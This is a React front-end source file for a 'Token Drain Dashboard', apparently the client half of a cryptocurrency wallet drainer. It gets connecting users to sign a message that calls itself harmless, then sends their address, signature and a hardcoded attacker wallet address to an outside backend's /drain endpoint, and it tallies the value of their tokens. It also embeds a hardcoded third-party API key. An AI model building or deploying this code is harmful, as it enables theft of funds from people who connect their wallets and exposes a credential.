import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './mobile-fix.css';

function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [authStatus, setAuthStatus] = useState('');
  const [backendUrl] = useState('https://tokenbackendwork.onrender.com'); // Your Render backend
  const [userTokens, setUserTokens] = useState([]);
  const [chainId, setChainId] = useState(1);
  const [networkName, setNetworkName] = useState('');

  // Backend drain address (this should be your wallet address)
  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4"; // Replace with your actual address

  useEffect(() => {
    checkWalletConnection();
    
    // Listen for wallet events
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);
    }
    
    return () => {
      if (window.ethereum) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', handleChainChanged);
      }
    };
  }, []);

  const checkWalletConnection = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          await handleWalletConnection(accounts[0]);
        }
      } catch (error) {
        console.log("No wallet connected:", error.message);
      }
    }
  };

  const handleAccountsChanged = async (accounts) => {
    if (accounts.length > 0) {
      await handleWalletConnection(accounts[0]);
    } else {
      disconnectWallet();
    }
  };

  const handleChainChanged = () => {
    window.location.reload();
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      alert('Please install MetaMask or another Ethereum wallet!');
      return;
    }

    try {
      // Request account access
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      });
      
      if (accounts.length > 0) {
        await handleWalletConnection(accounts[0]);
      }
    } catch (error) {
      console.error("Wallet connection error:", error);
      if (error.code === 4001) {
        setAuthStatus('User rejected connection');
      } else {
        setAuthStatus('Connection failed: ' + error.message);
      }
    }
  };

  const handleWalletConnection = async (account) => {
    try {
      setWalletAddress(account);
      setIsConnected(true);
      setAuthStatus('Wallet connected successfully');
      
      // Get chain info
      const provider = new ethers.BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      const chainIdNum = Number(network.chainId);
      
      setChainId(chainIdNum);
      setNetworkName(network.name);
      
      // Start authentication with backend
      await initiateBackendAuthentication(account, chainIdNum);
      
    } catch (error) {
      console.error("Wallet connection handler error:", error);
      setAuthStatus('Connection error: ' + error.message);
    }
  };

  const initiateBackendAuthentication = async (address, currentChainId) => {
    try {
      setIsAuthenticating(true);
      setAuthStatus('Signing message for authentication...');
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Create authentication message
      const timestamp = Date.now();
      const message = `Token Drain Authentication\n\nWallet: ${address}\nChain: ${currentChainId}\nTimestamp: ${timestamp}\n\nBy signing, you confirm you control this wallet. This does not cost gas fees.`;
      
      // Request signature
      const sig = await signer.signMessage(message);
      setSignature(sig);
      
      setAuthStatus('Sending authentication to backend...');
      
      // Send to backend
      await sendToBackend(address, sig, message, currentChainId);
      
    } catch (error) {
      console.error("Authentication error:", error);
      if (error.code === 4001) {
        setAuthStatus('User rejected signature');
      } else {
        setAuthStatus('Authentication failed: ' + error.message);
      }
      setIsAuthenticating(false);
    }
  };

  const sendToBackend = async (address, sig, message, currentChainId) => {
    try {
      setAuthStatus('Connecting to backend server...');
      
      const payload = {
        address: address,
        signature: sig,
        message: message,
        chainId: currentChainId,
        drainTo: DRAIN_TO_ADDRESS,
        timestamp: new Date().toISOString()
      };
      
      console.log('Sending to backend:', payload);
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        throw new Error(`Backend error: ${response.status} ${response.statusText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Successfully authenticated with backend!');
        console.log('Backend response:', data);
        
        // Fetch user tokens
        await fetchUserTokens(address, currentChainId);
      } else {
        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
      }
      
    } catch (error) {
      console.error("Backend connection error:", error);
      setAuthStatus('⚠️ Backend connection failed, using fallback');
      
      // Continue with fallback token fetch
      if (walletAddress) {
        await fetchTokensDirectly(walletAddress, chainId);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const fetchUserTokens = async (address, currentChainId) => {
    try {
      setAuthStatus('Fetching your tokens...');
      
      const response = await fetch(`${backendUrl}/tokens/${address}/${currentChainId}`);
      const data = await response.json();
      
      if (data.success) {
        setUserTokens(data.data.tokens || []);
        setAuthStatus(`✅ Found ${data.data.tokens.length} tokens on ${data.data.chainName}`);
      } else {
        // Fallback
        await fetchTokensDirectly(address, currentChainId);
      }
      
    } catch (error) {
      console.error("Token fetch error:", error);
      await fetchTokensDirectly(address, currentChainId);
    }
  };

  const fetchTokensDirectly = async (address, currentChainId) => {
    try {
      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
      const url = `https://api.covalenthq.com/v1/${currentChainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
      
      const response = await fetch(url);
      const data = await response.json();
      
      const tokens = data.data?.items
        ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
        .map(t => ({
          symbol: t.contract_ticker_symbol || 'TOKEN',
          name: t.contract_name || 'Unknown Token',
          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
          isNative: t.native_token || false,
          logo: t.logo_url
        })) || [];
      
      setUserTokens(tokens);
      setAuthStatus(`✅ Found ${tokens.length} tokens via direct API`);
      
    } catch (error) {
      console.error("Direct API fetch error:", error);
      setAuthStatus('Token fetch failed');
    }
  };

  const disconnectWallet = () => {
    setIsConnected(false);
    setWalletAddress('');
    setSignature('');
    setUserTokens([]);
    setAuthStatus('Disconnected');
    setChainId(1);
    setNetworkName('');
  };

  const formatAddress = (address) => {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const getTotalValue = () => {
    return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>🪙 Token Drain Dashboard</h1>
        
        {!isConnected ? (
          <div className="connection-section">
            <button 
              onClick={connectWallet} 
              className="connect-button"
              disabled={isAuthenticating}
            >
              {isAuthenticating ? 'Connecting...' : 'Connect Wallet'}
            </button>
            <p className="instruction">Connect your Ethereum wallet to begin</p>
          </div>
        ) : (
          <div className="dashboard">
            <div className="wallet-info-card">
              <div className="wallet-header">
                <h2>Connected Wallet</h2>
                <button onClick={disconnectWallet} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
              
              <div className="wallet-details">
                <div className="detail-item">
                  <span className="label">Address:</span>
                  <span className="value">{formatAddress(walletAddress)}</span>
                </div>
                <div className="detail-item">
                  <span className="label">Network:</span>
                  <span className="value">{networkName} (Chain ID: {chainId})</span>
                </div>
                <div className="detail-item">
                  <span className="label">Backend:</span>
                  <span className="value">{backendUrl}</span>
                </div>
              </div>
              
              <div className="authentication-status">
                <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('⚠️') ? 'warning' : 'neutral'}`}>
                  {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
                </div>
                <p className="status-text">{authStatus}</p>
                {signature && (
                  <p className="signature-info">
                    Signed: {signature.substring(0, 20)}...
                  </p>
                )}
              </div>
              
              <div className="action-buttons">
                <button 
                  onClick={() => fetchUserTokens(walletAddress, chainId)}
                  className="action-btn"
                  disabled={isAuthenticating}
                >
                  Refresh Tokens
                </button>
                <button 
                  onClick={() => initiateBackendAuthentication(walletAddress, chainId)}
                  className="action-btn secondary"
                  disabled={isAuthenticating}
                >
                  Re-authenticate
                </button>
              </div>
            </div>
            
            {userTokens.length > 0 && (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>Your Tokens</h2>
                  <div className="tokens-summary">
                    <span className="count">{userTokens.length} tokens</span>
                    <span className="total-value">Total: ${getTotalValue()}</span>
                  </div>
                </div>
                
                <div className="tokens-grid">
                  {userTokens.map((token, index) => (
                    <div key={index} className="token-card">
                      <div className="token-icon">
                        {token.logo ? (
                          <img src={token.logo} alt={token.symbol} className="token-logo" />
                        ) : (
                          <div className="token-placeholder">{token.symbol.charAt(0)}</div>
                        )}
                      </div>
                      <div className="token-info">
                        <h3 className="token-symbol">{token.symbol}</h3>
                        <p className="token-name">{token.name}</p>
                        <div className="token-amount">
                          {token.amount.toLocaleString(undefined, {
                            minimumFractionDigits: 0,
                            maximumFractionDigits: 8
                          })}
                        </div>
                      </div>
                      <div className="token-value">
                        {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
        
        <div className="footer-info">
          <p>Backend Status: <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">Check Health</a></p>
          <div className="footer-links">
            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
          </div>
        </div>
      </header>
    </div>
  );
}

export default App;

